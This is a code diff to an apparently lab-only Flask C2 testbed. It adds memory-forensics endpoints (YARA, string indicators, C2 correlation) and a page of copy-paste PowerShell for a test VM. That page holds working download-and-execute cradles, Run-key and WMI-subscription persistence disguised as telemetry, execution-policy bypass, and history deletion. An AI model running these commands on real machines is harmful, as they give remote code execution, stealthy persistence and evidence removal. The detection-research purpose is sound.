@@ -16,6 +16,19 @@ from pathlib import Path
 from flask import Flask, request, send_file, jsonify, render_template_string
 from ai_backend_client import analyze_with_backend
 from flag_detection import manual_detect, summarize_detection
+from forensic_analysis import (
+    ForensicAnalyzer,
+    load_forensic_config,
+    extract_strings_from_dump,
+    search_indicators,
+    scan_with_yara,
+    load_yara_rules,
+    correlate_with_c2,
+    ai_triage_artifact,
+    start_forensic_task,
+    get_task,
+    list_tasks,
+)
 
 app = Flask(__name__)
 BASE_DIR = Path(__file__).resolve().parent
@@ -58,14 +71,17 @@ def get_best_local_ip():
     except:
         return "127.0.0.1"
 
-# Load config file if exists, otherwise create with auto-detected IP
+# Load config file if exists, but always re-detect host_ip for VM bridge
 if CONFIG_FILE.exists():
     with open(CONFIG_FILE, 'r') as f:
         saved = json.load(f)
-        DEFAULT_CONFIG.update(saved)
+        if isinstance(saved, dict):
+            # Don't load stale host_ip from config — re-detect dynamically
+            saved.pop("host_ip", None)
+            DEFAULT_CONFIG.update(saved)
 
-if not DEFAULT_CONFIG["host_ip"]:
-    DEFAULT_CONFIG["host_ip"] = get_best_local_ip()
+# Always auto-detect the best IP for VMs (virbr0 > br0 > default route)
+DEFAULT_CONFIG["host_ip"] = get_best_local_ip()
 
 def configured_path(config_key):
     path = Path(DEFAULT_CONFIG[config_key])
@@ -86,6 +102,7 @@ for directory in [PAYLOAD_DIR, LOG_DIR, FLAGS_DIR]:
 # In-memory session tracking
 active_sessions = {}
 MANUAL_LABELS_FILE = LOG_DIR / "manual_labels.json"
+FORENSIC_LABELS_FILE = LOG_DIR / "forensic_labels.json"
 
 
 def load_manual_labels():
@@ -102,6 +119,23 @@ def load_manual_labels():
 
 def save_manual_labels(labels):
     with open(MANUAL_LABELS_FILE, 'w') as f:
+        json.dump(labels, f, indent=2)
+
+
+def load_forensic_labels():
+    if FORENSIC_LABELS_FILE.exists():
+        try:
+            with open(FORENSIC_LABELS_FILE, 'r') as f:
+                data = json.load(f)
+                if isinstance(data, dict):
+                    return data
+        except:
+            pass
+    return {}
+
+
+def save_forensic_labels(labels):
+    with open(FORENSIC_LABELS_FILE, 'w') as f:
         json.dump(labels, f, indent=2)
 
 
@@ -256,6 +290,14 @@ DASHBOARD_HTML = '''
         <div id="ai-settings-status"></div>
     </div>
 
+    <div class="settings-card">
+        <h2>🖥 VM Payload Commands</h2>
+        <p>Copy-paste PowerShell commands for the Windows VM (IP: <strong>{{ host_ip }}</strong>)</p>
+        <div class="settings-grid">
+            <button onclick="window.open('/vm-commands','_blank')">Open VM Commands Page</button>
+        </div>
+    </div>
+
     <h2>📊 Received Flags (Last 50)</h2>
     <table>
         <tr><th>Timestamp</th><th>Source IP</th><th>Technique</th><th>Manual</th><th>Manual Source</th><th>AI</th><th>AI Backend</th><th>Details</th></tr>
@@ -318,9 +360,69 @@ DASHBOARD_HTML = '''
         <li><span class="endpoint">GET /dashboard</span> - This dashboard</li>
         <li><span class="endpoint">GET /api/flags</span> - JSON API</li>
         <li><span class="endpoint">POST /manual/label</span> - Attach external manual verdict (Volatility/IR)</li>
+        <li><span class="endpoint">GET /vm-commands</span> - <a href="/vm-commands">Copy-paste PowerShell commands for VM</a></li>
         <li><span class="endpoint">AI Backend URL</span> - {{ ai_backend_url }}</li>
         <li><span class="endpoint">GET /status</span> - Health check</li>
     </ul>
+
+    <h2>🔬 Forensic Memory Analysis</h2>
+    <div class="settings-card">
+        <h3>⚙ Run Analysis on Memory Dump</h3>
+        <div class="settings-grid">
+            <input id="dump-path" placeholder="/path/to/memory.raw" value="" style="grid-column: span 2;" />
+            <input id="target-pid" placeholder="PID (optional)" value="" />
+            <button onclick="runForensicAnalyzeAsync()">🔬 Start Async Analyze</button>
+            <button class="test" onclick="runForensicStrings()">📄 Strings</button>
+            <button class="test" onclick="runForensicYara()">🎯 YARA</button>
+            <button onclick="runForensicCorrelate()">🔗 Correlate C2</button>
+            <button onclick="loadForensicReports()">📁 Reports</button>
+            <button onclick="loadForensicTasks()">⏳ Tasks</button>
+        </div>
+        {% if available_dumps %}
+        <div style="margin-top:8px; font-size:12px; color:#858585;">
+            Available dumps:
+            {% for d in available_dumps %}
+            <a href="javascript:void(0)" onclick="document.getElementById('dump-path').value='{{ d }}'" style="color:#4ec9b0; text-decoration:underline; margin-right:10px;">{{ d.split('/')[-1] }}</a>
+            {% endfor %}
+        </div>
+        {% endif %}
+        <div id="forensic-status" style="margin-top:8px; color:#dcdcaa; min-height:20px;"></div>
+        <div id="forensic-progress-bar" style="display:none; margin-top:10px; background:#1d1d1d; border:1px solid #3e3e3e; height:20px; width:100%;">
+            <div id="forensic-progress-fill" style="background:#007f6b; height:100%; width:0%; transition:width 0.3s;"></div>
+        </div>
+    </div>
+
+    <div id="forensic-tasks" style="display:none; margin-top:20px;">
+        <h3>⏳ Analysis Tasks</h3>
+        <table>
+            <tr><th>Task ID</th><th>Status</th><th>Progress</th><th>Message</th><th>Dump</th></tr>
+            <tbody id="forensic-tasks-body"></tbody>
+        </table>
+    </div>
+
+    <div id="forensic-results" style="display:none; margin-top:20px;">
+        <h3>📊 Analysis Results</h3>
+        <div id="forensic-summary" style="margin-bottom:20px;"></div>
+        <div id="forensic-findings" style="margin-bottom:20px;"></div>
+        <div id="forensic-prioritized" style="margin-bottom:20px;"></div>
+        <div id="forensic-strings" style="margin-bottom:20px;"></div>
+        <div id="forensic-yara" style="margin-bottom:20px;"></div>
+        <div id="forensic-correlation" style="margin-bottom:20px;"></div>
+        <pre id="forensic-raw" style="background:#1d1d1d; padding:12px; overflow:auto; max-height:400px; border:1px solid #3e3e3e;"></pre>
+    </div>
+
+    <h2>📁 Forensic Reports</h2>
+    <table>
+        <tr><th>Name</th><th>Size</th><th>Modified</th><th>Path</th></tr>
+        {% for r in forensic_reports %}
+        <tr>
+            <td><a href="javascript:void(0)" onclick="loadReportDetail('{{ r.name }}')">{{ r.name }}</a></td>
+            <td>{{ r.size }}</td>
+            <td class="timestamp">{{ r.mtime }}</td>
+            <td>{{ r.path }}</td>
+        </tr>
+        {% endfor %}
+    </table>
 
     <h2>💻 Active VM Sessions</h2>
     <table>
@@ -348,6 +450,9 @@ async function postJson(url, body) {
 function setStatus(message) {
     document.getElementById('ai-settings-status').textContent = message;
 }
+function setForensicStatus(message) {
+    document.getElementById('forensic-status').textContent = message;
+}
 
 async function saveAiSettings() {
     const ip = document.getElementById('ai-backend-ip').value.trim();
@@ -372,6 +477,188 @@ async function testAiBackend() {
         text: 'FLAG{T1059.001-powershell-execution}'
     });
     setStatus(result.message || JSON.stringify(result));
+}
+
+// Forensic analysis UI handlers
+function showForensicResults(data) {
+    document.getElementById('forensic-results').style.display = 'block';
+    document.getElementById('forensic-raw').textContent = JSON.stringify(data, null, 2);
+
+    // Prioritized processes
+    const prioritized = data.report && data.report.phases && data.report.phases.prioritized_processes ? data.report.phases.prioritized_processes : [];
+    let procHtml = '<h4>🔍 Prioritized Processes</h4>';
+    if (prioritized.length) {
+        procHtml += '<table><tr><th>PID</th><th>Name</th><th>Score</th><th>Reasons</th></tr>';
+        for (const p of prioritized.slice(0, 10)) {
+            procHtml += `<tr><td>${p.pid}</td><td>${p.name}</td><td>${p.score.toFixed(2)}</td><td>${p.reasons.join('; ')}</td></tr>`;
+        }
+        procHtml += '</table>';
+    } else {
+        procHtml += '<p>No prioritized processes found.</p>';
+    }
+    document.getElementById('forensic-prioritized').innerHTML = procHtml;
+
+    // Strings
+    const stringsPhase = data.report && data.report.phases && data.report.phases.strings ? data.report.phases.strings : {};
+    let strHtml = `<h4>📄 Strings (${stringsPhase.total_strings || 0}) — Indicator Hits: ${(stringsPhase.indicator_hits || []).length}</h4>`;
+    if ((stringsPhase.indicator_hits || []).length) {
+        strHtml += '<table><tr><th>String</th><th>Pattern</th></tr>';
+        for (const h of stringsPhase.indicator_hits.slice(0, 20)) {
+            strHtml += `<tr><td style="word-break:break-all;">${h.string}</td><td>${h.pattern}</td></tr>`;
+        }
+        strHtml += '</table>';
+    }
+    document.getElementById('forensic-strings').innerHTML = strHtml;
+
+    // YARA
+    const yaraPhase = data.report && data.report.phases && data.report.phases.yara ? data.report.phases.yara : {};
+    let yaraHtml = `<h4>🎯 YARA Matches: ${(yaraPhase.matches || []).length}</h4>`;
+    if ((yaraPhase.matches || []).length) {
+        yaraHtml += '<table><tr><th>Rule</th><th>File</th><th>Strings</th></tr>';
+        for (const m of yaraPhase.matches) {
+            const sids = (m.strings || []).map(s => s.identifier).join(', ');
+            yaraHtml += `<tr><td>${m.rule}</td><td>${m.file}</td><td>${sids}</td></tr>`;
+        }
+        yaraHtml += '</table>';
+    }
+    document.getElementById('forensic-yara').innerHTML = yaraHtml;
+
+    // Correlation
+    const corrPhase = data.report && data.report.phases && data.report.phases.correlation ? data.report.phases.correlation : {};
+    let corrHtml = `<h4>🔗 C2 Correlations: ${(corrPhase.correlations || []).length}</h4>`;
+    if ((corrPhase.correlations || []).length) {
+        corrHtml += '<table><tr><th>Technique</th><th>Score</th><th>Reasons</th></tr>';
+        for (const c of corrPhase.correlations.slice(0, 10)) {
+            corrHtml += `<tr><td>${c.c2_event.technique || '?'}</td><td>${c.correlation_score}</td><td>${c.reasons.join('; ')}</td></tr>`;
+        }
+        corrHtml += '</table>';
+    }
+    document.getElementById('forensic-correlation').innerHTML = corrHtml;
+
+    // Findings (enhanced human-readable)
+    const findings = data.report && data.report.findings ? data.report.findings : [];
+    const summary = data.report && data.report.summary ? data.report.summary : {};
+    let findingsHtml = `<h4>🔍 Findings (${findings.length}) — Critical: ${summary.critical || 0}, High: ${summary.high || 0}, Medium: ${summary.medium || 0}</h4>`;
+    if (findings.length) {
+        findingsHtml += '<table><tr><th>Severity</th><th>Type</th><th>What</th><th>Where</th><th>Why</th><th>Manual</th></tr>';
+        for (let i = 0; i < findings.length; i++) {
+            const f = findings[i];
+            const color = f.severity === 'critical' ? '#ce9178' : f.severity === 'high' ? '#dcdcaa' : f.severity === 'medium' ? '#9cdcfe' : '#6a9955';
+            const manualBtn = `<button class="copy-btn" onclick="labelFinding('${data.report_name || ''}', ${i}, true)">✓ Yes</button> <button class="copy-btn" onclick="labelFinding('${data.report_name || ''}', ${i}, false)">✗ No</button>`;
+            findingsHtml += `<tr><td style="color:${color}">${f.severity}</td><td>${f.type}</td><td style="word-break:break-all;">${f.what}</td><td>${f.where}</td><td>${f.why}</td><td>${manualBtn}</td></tr>`;
+        }
+        findingsHtml += '</table>';
+    }
+    document.getElementById('forensic-findings').innerHTML = findingsHtml;
+}
+
+let _pollInterval = null;
+
+async function runForensicAnalyzeAsync() {
+    const path = document.getElementById('dump-path').value.trim();
+    const pid = document.getElementById('target-pid').value.trim();
+    if (!path) { setForensicStatus('Enter a dump path'); return; }
+    setForensicStatus('Starting async forensic analysis...');
+    document.getElementById('forensic-progress-bar').style.display = 'block';
+    document.getElementById('forensic-progress-fill').style.width = '0%';
+    const result = await postJson('/forensic/analyze-async', { dump_path: path, pid: pid ? parseInt(pid) : null });
+    if (result.error) { setForensicStatus('Error: ' + result.error); return; }
+    setForensicStatus('Analysis running. Task ID: ' + result.task_id);
+    pollTask(result.task_id);
+}
+
+function pollTask(taskId) {
+    if (_pollInterval) clearInterval(_pollInterval);
+    _pollInterval = setInterval(async () => {
+        const resp = await fetch('/forensic/tasks/' + taskId);
+        const data = await resp.json();
+        const task = data.task;
+        if (!task) return;
+        setForensicStatus(task.message + ' (' + task.progress + '%)');
+        document.getElementById('forensic-progress-fill').style.width = task.progress + '%';
+        if (task.status === 'completed') {
+            clearInterval(_pollInterval);
+            setForensicStatus('Analysis complete! Report: ' + task.report_path);
+            document.getElementById('forensic-progress-bar').style.display = 'none';
+            showForensicResults({report: task.report, report_name: task.report_path.split('/').pop()});
+        } else if (task.status === 'error') {
+            clearInterval(_pollInterval);
+            setForensicStatus('Error: ' + task.message);
+            document.getElementById('forensic-progress-bar').style.display = 'none';
+        }
+    }, 1500);
+}
+
+async function loadForensicTasks() {
+    const resp = await fetch('/forensic/tasks');
+    const data = await resp.json();
+    const tbody = document.getElementById('forensic-tasks-body');
+    tbody.innerHTML = '';
+    for (const t of data.tasks.slice(0, 10)) {
+        const row = document.createElement('tr');
+        row.innerHTML = `<td>${t.id.substring(0,8)}</td><td>${t.status}</td><td>${t.progress}%</td><td>${t.message}</td><td>${t.dump_path ? t.dump_path.split('/').pop() : ''}</td>`;
+        tbody.appendChild(row);
+    }
+    document.getElementById('forensic-tasks').style.display = 'block';
+}
+
+async function loadReportDetail(reportName) {
+    const resp = await fetch('/forensic/report/' + encodeURIComponent(reportName));
+    const data = await resp.json();
+    if (data.error) { setForensicStatus(data.error); return; }
+    document.getElementById('forensic-results').style.display = 'block';
+    showForensicResults({report: data.report, report_name: reportName});
+}
+
+async function labelFinding(reportName, findingIndex, detected) {
+    const result = await postJson('/forensic/label', {
+        report_name: reportName,
+        finding_index: findingIndex,
+        detected: detected,
+    });
+    if (result.status === 'saved') {
+        setForensicStatus('Label saved');
+        loadReportDetail(reportName);
+    }
+}
+
+async function runForensicStrings() {
+    const path = document.getElementById('dump-path').value.trim();
+    if (!path) { setForensicStatus('Enter a dump path'); return; }
+    setForensicStatus('Extracting strings...');
+    const result = await postJson('/forensic/strings', { dump_path: path });
+    if (result.error) { setForensicStatus('Error: ' + result.error); return; }
+    setForensicStatus(`Strings: ${result.total_strings}, indicators: ${result.indicator_hits.length}`);
+    document.getElementById('forensic-results').style.display = 'block';
+    document.getElementById('forensic-raw').textContent = JSON.stringify(result, null, 2);
+}
+
+async function runForensicYara() {
+    const path = document.getElementById('dump-path').value.trim();
+    if (!path) { setForensicStatus('Enter a dump path'); return; }
+    setForensicStatus('Running YARA scan...');
+    const result = await postJson('/forensic/yara', { target_path: path });
+    if (result.error) { setForensicStatus('Error: ' + result.error); return; }
+    setForensicStatus(`YARA matches: ${result.matches.length}`);
+    document.getElementById('forensic-results').style.display = 'block';
+    document.getElementById('forensic-raw').textContent = JSON.stringify(result, null, 2);
+}
+
+async function runForensicCorrelate() {
+    setForensicStatus('Correlating with C2 logs...');
+    const result = await postJson('/forensic/correlate', {});
+    setForensicStatus(`C2 events: ${result.correlation.c2_events_count}, correlations: ${result.correlation.correlations.length}`);
+    document.getElementById('forensic-results').style.display = 'block';
+    document.getElementById('forensic-raw').textContent = JSON.stringify(result, null, 2);
+}
+
+async function loadForensicReports() {
+    setForensicStatus('Loading reports...');
+    const resp = await fetch('/forensic/reports');
+    const result = await resp.json();
+    setForensicStatus(`Reports loaded: ${result.reports.length}`);
+    document.getElementById('forensic-results').style.display = 'block';
+    document.getElementById('forensic-raw').textContent = JSON.stringify(result, null, 2);
 }
 </script>
 </body>
@@ -402,6 +689,30 @@ def dashboard():
     payloads = [f.name for f in PAYLOAD_DIR.iterdir() if f.is_file()]
     backend = parse_backend_target(DEFAULT_CONFIG["ai_backend_url"])
 
+    # Load forensic reports for dashboard
+    forensic_reports = []
+    output_dir = Path(load_forensic_config().get("output_dir",
+                                                  str(BASE_DIR / "forensic_output")))
+    if output_dir.exists():
+        for f in sorted(output_dir.glob("forensic_report_*.json"), reverse=True)[:20]:
+            try:
+                stat = f.stat()
+                forensic_reports.append({
+                    "name": f.name,
+                    "path": str(f),
+                    "size": stat.st_size,
+                    "mtime": datetime.datetime.fromtimestamp(stat.st_mtime).isoformat(),
+                })
+            except Exception:
+                continue
+
+    # Load available memory dumps for quick-select
+    dumps_dir = BASE_DIR / "lab" / "dumps"
+    available_dumps = []
+    if dumps_dir.exists():
+        for f in sorted(dumps_dir.glob("*.raw"), reverse=True)[:10]:
+            available_dumps.append(str(f))
+
     return render_template_string(DASHBOARD_HTML,
                                   logs=logs,
                                   detection_summary=detection_summary,
@@ -413,7 +724,9 @@ def dashboard():
                                   ai_backend_timeout_seconds=DEFAULT_CONFIG["ai_backend_timeout_seconds"],
                                   ai_analysis_enabled=DEFAULT_CONFIG.get("ai_analysis_enabled", True),
                                   host_ip=DEFAULT_CONFIG["host_ip"],
-                                  port=DEFAULT_CONFIG["c2_port"])
+                                  port=DEFAULT_CONFIG["c2_port"],
+                                  forensic_reports=forensic_reports,
+                                  available_dumps=available_dumps)
 
 @app.route('/status')
 def status():
@@ -644,6 +957,337 @@ def clear_logs():
     return jsonify({"status": "cleared"})
 
 # ------------------------------------------------------------
+# Forensic Analysis Endpoints
+# ------------------------------------------------------------
+@app.route('/forensic/analyze', methods=['POST'])
+def forensic_analyze():
+    payload = request.get_json(silent=True) or {}
+    dump_path = payload.get("dump_path", "")
+    target_pid = payload.get("pid")
+
+    if not dump_path or not Path(dump_path).exists():
+        return jsonify({"error": "dump_path required and must exist"}), 400
+
+    config = load_forensic_config()
+    analyzer = ForensicAnalyzer(dump_path, config)
+    analyzer.full_analysis(target_pid)
+    report_path = analyzer.save_report()
+    return jsonify({
+        "status": "ok",
+        "report_path": report_path,
+        "report": analyzer.report,
+    })
+
+
+@app.route('/forensic/strings', methods=['POST'])
+def forensic_strings():
+    payload = request.get_json(silent=True) or {}
+    dump_path = payload.get("dump_path", "")
+    min_length = payload.get("min_length", 8)
+
+    if not dump_path or not Path(dump_path).exists():
+        return jsonify({"error": "dump_path required and must exist"}), 400
+
+    strings = extract_strings_from_dump(dump_path, min_length)
+    indicators = search_indicators(strings)
+    return jsonify({
+        "status": "ok",
+        "total_strings": len(strings),
+        "indicator_hits": indicators,
+    })
+
+
+@app.route('/forensic/yara', methods=['POST'])
+def forensic_yara():
+    payload = request.get_json(silent=True) or {}
+    target_path = payload.get("target_path", "")
+
+    if not target_path or not Path(target_path).exists():
+        return jsonify({"error": "target_path required and must exist"}), 400
+
+    rules = load_yara_rules()
+    matches = scan_with_yara(target_path, rules)
+    return jsonify({
+        "status": "ok",
+        "matches": matches,
+    })
+
+
+@app.route('/forensic/correlate', methods=['POST'])
+def forensic_correlate():
+    payload = request.get_json(silent=True) or {}
+    events = payload.get("events", [])
+    window = payload.get("window_seconds", 300)
+    c2_log = payload.get("c2_log_file", str(LOG_DIR / "c2_log.json"))
+
+    result = correlate_with_c2(events, c2_log, window)
+    return jsonify({
+        "status": "ok",
+        "correlation": result,
+    })
+
+
+@app.route('/forensic/triage', methods=['POST'])
+def forensic_triage():
+    payload = request.get_json(silent=True) or {}
+    text = payload.get("text", "")
+    artifact_type = payload.get("artifact_type", "memory_string")
+
+    if not text:
+        return jsonify({"error": "text required"}), 400
+
+    result = ai_triage_artifact(
+        text,
+        artifact_type,
+        backend_url=DEFAULT_CONFIG.get("ai_backend_url"),
+        timeout=DEFAULT_CONFIG.get("ai_backend_timeout_seconds", 8),
+    )
+    return jsonify({
+        "status": "ok",
+        "result": result,
+    })
+
+
+@app.route('/forensic/reports')
+def forensic_reports():
+    output_dir = Path(load_forensic_config().get("output_dir",
+                                                  str(BASE_DIR / "forensic_output")))
+    reports = []
+    if output_dir.exists():
+        for f in sorted(output_dir.glob("forensic_report_*.json"), reverse=True):
+            try:
+                stat = f.stat()
+                reports.append({
+                    "name": f.name,
+                    "path": str(f),
+                    "size": stat.st_size,
+                    "mtime": datetime.datetime.fromtimestamp(stat.st_mtime).isoformat(),
+                })
+            except Exception:
+                continue
+    return jsonify({"reports": reports})
+
+
+@app.route('/forensic/analyze-async', methods=['POST'])
+def forensic_analyze_async():
+    payload = request.get_json(silent=True) or {}
+    dump_path = payload.get("dump_path", "")
+    target_pid = payload.get("pid")
+
+    if not dump_path or not Path(dump_path).exists():
+        return jsonify({"error": "dump_path required and must exist"}), 400
+
+    config = load_forensic_config()
+    task_id = start_forensic_task(dump_path, target_pid, config)
+    return jsonify({
+        "status": "ok",
+        "task_id": task_id,
+        "message": "Analysis started. Poll /forensic/tasks/" + task_id + " for progress.",
+    })
+
+
+@app.route('/forensic/tasks')
+def forensic_tasks():
+    return jsonify({
+        "status": "ok",
+        "tasks": list_tasks(),
+    })
+
+
+@app.route('/forensic/tasks/<task_id>')
+def forensic_task_detail(task_id):
+    task = get_task(task_id)
+    if not task:
+        return jsonify({"error": "Task not found"}), 404
+    return jsonify({
+        "status": "ok",
+        "task": task,
+    })
+
+
+@app.route('/forensic/label', methods=['POST'])
+def forensic_label():
+    payload = request.get_json(silent=True) or {}
+    report_name = payload.get("report_name", "")
+    finding_index = payload.get("finding_index")
+    detected = payload.get("detected")
+    notes = payload.get("notes", "")
+    analyst = payload.get("analyst", "analyst")
+
+    if not report_name or finding_index is None or detected is None:
+        return jsonify({"error": "report_name, finding_index, and detected are required"}), 400
+
+    labels = load_forensic_labels()
+    key = f"{report_name}|{finding_index}"
+    labels[key] = {
+        "report_name": report_name,
+        "finding_index": finding_index,
+        "detected": bool(detected),
+        "notes": notes,
+        "analyst": analyst,
+        "labeled_at": datetime.datetime.now().isoformat(),
+    }
+    save_forensic_labels(labels)
+    return jsonify({"status": "saved", "key": key})
+
+
+@app.route('/forensic/report/<report_name>')
+def forensic_report_detail(report_name):
+    output_dir = Path(load_forensic_config().get("output_dir",
+                                                  str(BASE_DIR / "forensic_output")))
+    report_path = output_dir / report_name
+    if not report_path.exists():
+        return jsonify({"error": "Report not found"}), 404
+
+    try:
+        with open(report_path, 'r') as f:
+            report = json.load(f)
+    except Exception:
+        return jsonify({"error": "Could not read report"}), 500
+
+    labels = load_forensic_labels()
+    findings = report.get("findings", [])
+    for idx, finding in enumerate(findings):
+        key = f"{report_name}|{idx}"
+        label = labels.get(key, {})
+        finding["manual_detected"] = label.get("detected")
+        finding["manual_notes"] = label.get("notes", "")
+        finding["manual_analyst"] = label.get("analyst", "")
+        finding["manual_source"] = "analyst" if label else "fallback-regex"
+
+    return jsonify({
+        "status": "ok",
+        "report": report,
+    })
+
+
+# ------------------------------------------------------------
+
+VM_COMMANDS_HTML = r"""
+<!DOCTYPE html>
+<html>
+<head>
+    <title>VM Quick Commands &mdash; C2 Testbed</title>
+    <style>
+        body { font-family: monospace; margin: 20px; background: #1e1e1e; color: #d4d4d4; }
+        h1 { color: #4ec9b0; }
+        h2 { color: #ce9178; margin-top: 30px; }
+        .container { max-width: 1200px; margin: auto; }
+        .cmd-card { border: 1px solid #3e3e3e; padding: 16px; margin-top: 16px; background: #252525; border-radius: 4px; }
+        .cmd-label { color: #9cdcfe; font-weight: bold; margin-bottom: 8px; display: block; }
+        pre { background: #1d1d1d; color: #d4d4d4; padding: 12px; border-radius: 4px; overflow-x: auto; white-space: pre-wrap; word-break: break-all; border: 1px solid #4a4a4a; }
+        .copy-btn { background: #007f6b; color: #fff; border: 0; padding: 6px 12px; cursor: pointer; margin-top: 8px; }
+        .copy-btn:hover { background: #005f4f; }
+        .note { color: #6a9955; font-size: 13px; margin-top: 8px; }
+        .warn { color: #ce9178; font-size: 13px; margin-top: 8px; }
+        a { color: #4ec9b0; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>&#x1F5A5; VM Quick Commands</h1>
+    <p>Copy-paste ready PowerShell commands for the Windows VM (target IP: <strong>{{ host_ip }}</strong>). <a href="/dashboard">&larr; Back to Dashboard</a></p>
+
+    <h2>&#x26A1; Prerequisites (run once in PowerShell as Admin)</h2>
+    <div class="cmd-card">
+        <span class="cmd-label">1. Set Execution Policy (allows scripts to run)</span>
+        <pre id="cmd-ep">Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force</pre>
+        <button class="copy-btn" onclick="copyToClipboard('cmd-ep')">Copy</button>
+        <div class="note">This only affects the current PowerShell window. For persistent bypass use -Scope LocalMachine.</div>
+    </div>
+
+    <div class="cmd-card">
+        <span class="cmd-label">2. Quick test &mdash; reach C2 server</span>
+        <pre id="cmd-test">Test-NetConnection -ComputerName {{ host_ip }} -Port {{ port }}</pre>
+        <button class="copy-btn" onclick="copyToClipboard('cmd-test')">Copy</button>
+    </div>
+
+    <h2>&#x1F4E5; Stage 1 &mdash; Full Scenario Payload</h2>
+    <div class="cmd-card">
+        <span class="cmd-label">Download &amp; execute stage1 (all 4 techniques)</span>
+        <pre id="cmd-stage1">powershell -ExecutionPolicy Bypass -Command &quot;IEX ((New-Object Net.WebClient).DownloadString('http://{{ host_ip }}:{{ port }}/get/stage1_windows.ps1'))&quot;</pre>
+        <button class="copy-btn" onclick="copyToClipboard('cmd-stage1')">Copy</button>
+        <div class="note">Sends: T1059.001 (execution), T1083 (discovery), T1105 (ingress), T1041 (exfiltration)</div>
+    </div>
+
+    <h2>&#x1F4E5; Stage 2 &mdash; Staged Downloader</h2>
+    <div class="cmd-card">
+        <span class="cmd-label">Download cradle &rarr; fetches obfuscated stage2</span>
+        <pre id="cmd-stage2">powershell -ExecutionPolicy Bypass -Command &quot;IEX ((New-Object Net.WebClient).DownloadString('http://{{ host_ip }}:{{ port }}/get/stage2_download_cradle.ps1'))&quot;</pre>
+        <button class="copy-btn" onclick="copyToClipboard('cmd-stage2')">Copy</button>
+        <div class="note">Downloads stage2 to $env:TEMP, executes it, then deletes the file.</div>
+    </div>
+
+    <h2>&#x1F3AD; Obfuscated Payload (T1027)</h2>
+    <div class="cmd-card">
+        <span class="cmd-label">Base64-encoded URL + flag decoded at runtime</span>
+        <pre id="cmd-obf">powershell -ExecutionPolicy Bypass -Command &quot;IEX ((New-Object Net.WebClient).DownloadString('http://{{ host_ip }}:{{ port }}/get/obfuscated_windows.ps1'))&quot;</pre>
+        <button class="copy-btn" onclick="copyToClipboard('cmd-obf')">Copy</button>
+        <div class="note">Contains System.Convert::FromBase64String artifacts for memory analysis.</div>
+    </div>
+
+    <h2>&#x1F512; Registry Persistence (T1547.001)</h2>
+    <div class="cmd-card">
+        <span class="cmd-label">Add Run key &mdash; payload executes on next logon</span>
+        <pre id="cmd-reg">$cmd = 'powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command &quot;IEX ((New-Object Net.WebClient).DownloadString('''http://{{ host_ip }}:{{ port }}/get/stage1_windows.ps1'''))&quot;'
+New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WinTelemetry' -Value $cmd -PropertyType String -Force</pre>
+        <button class="copy-btn" onclick="copyToClipboard('cmd-reg')">Copy</button>
+        <div class="warn">&#x26A0; This creates real persistence. Remove after experiments:</div>
+        <pre id="cmd-reg-rm">Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WinTelemetry' -Force</pre>
+        <button class="copy-btn" onclick="copyToClipboard('cmd-reg-rm')">Copy Cleanup</button>
+    </div>
+
+    <h2>&#x1F512; WMI Persistence (T1546.003)</h2>
+    <div class="cmd-card">
+        <span class="cmd-label">WMI event subscription &mdash; event-triggered execution</span>
+        <pre id="cmd-wmi">$filter = Set-WmiInstance -Class __EventFilter -Namespace 'root\subscription' -Arguments @{Name='UpdateFilter'; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'' AND TargetInstance.SystemUpTime &gt;= 300'}
+$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace 'root\subscription' -Arguments @{Name='UpdateConsumer'; CommandLineTemplate='powershell -NoProfile -ExecutionPolicy Bypass -Command &quot;IEX ((New-Object Net.WebClient).DownloadString('''http://{{ host_ip }}:{{ port }}/get/stage1_windows.ps1'''))&quot;'}
+Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\subscription' -Arguments @{Filter=$filter; Consumer=$consumer}</pre>
+        <button class="copy-btn" onclick="copyToClipboard('cmd-wmi')">Copy</button>
+        <div class="warn">&#x26A0; Cleanup after experiments:</div>
+        <pre id="cmd-wmi-rm">Get-WmiObject -Class __EventFilter -Namespace 'root\subscription' -Filter &quot;Name='UpdateFilter'&quot; | Remove-WmiObject
+Get-WmiObject -Class CommandLineEventConsumer -Namespace 'root\subscription' -Filter &quot;Name='UpdateConsumer'&quot; | Remove-WmiObject
+Get-WmiObject -Class __FilterToConsumerBinding -Namespace 'root\subscription' | Where-Object { $_.Filter.Name -eq 'UpdateFilter' } | Remove-WmiObject</pre>
+        <button class="copy-btn" onclick="copyToClipboard('cmd-wmi-rm')">Copy Cleanup</button>
+    </div>
+
+    <h2>&#x1F9F9; Cleanup / Reset</h2>
+    <div class="cmd-card">
+        <span class="cmd-label">Clear temp files and PowerShell history</span>
+        <pre id="cmd-clean">Remove-Item &quot;$env:TEMP\stage2.ps1&quot; -Force -ErrorAction SilentlyContinue
+Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue</pre>
+        <button class="copy-btn" onclick="copyToClipboard('cmd-clean')">Copy</button>
+    </div>
+
+    <h2>&#x1F517; Useful Links</h2>
+    <ul>
+        <li><a href="/dashboard">C2 Dashboard</a></li>
+        <li><a href="/status">C2 Status</a></li>
+        <li><a href="/api/flags">JSON API</a></li>
+    </ul>
+</div>
+<script>
+function copyToClipboard(elementId) {
+    const text = document.getElementById(elementId).innerText;
+    navigator.clipboard.writeText(text).then(() => {
+        const btn = document.querySelector('[onclick="copyToClipboard(' + "'" + elementId + "'" + ')"]');
+        const oldText = btn.innerText;
+        btn.innerText = 'Copied!';
+        setTimeout(() => btn.innerText = oldText, 1200);
+    });
+}
+</script>
+</body>
+</html>
+"""
+
+
+@app.route('/vm-commands')
+def vm_commands():
+    return render_template_string(VM_COMMANDS_HTML,
+                                  host_ip=DEFAULT_CONFIG["host_ip"],
+                                  port=DEFAULT_CONFIG["c2_port"])
+
 # Main
 # ------------------------------------------------------------
 if __name__ == '__main__':
@@ -658,3 +1302,6 @@ if __name__ == '__main__':
     ╚═══════════════════════════════════════════════════════════╝
     """)
     app.run(host='0.0.0.0', port=DEFAULT_CONFIG['c2_port'], debug=False, threaded=True)
+
+
+
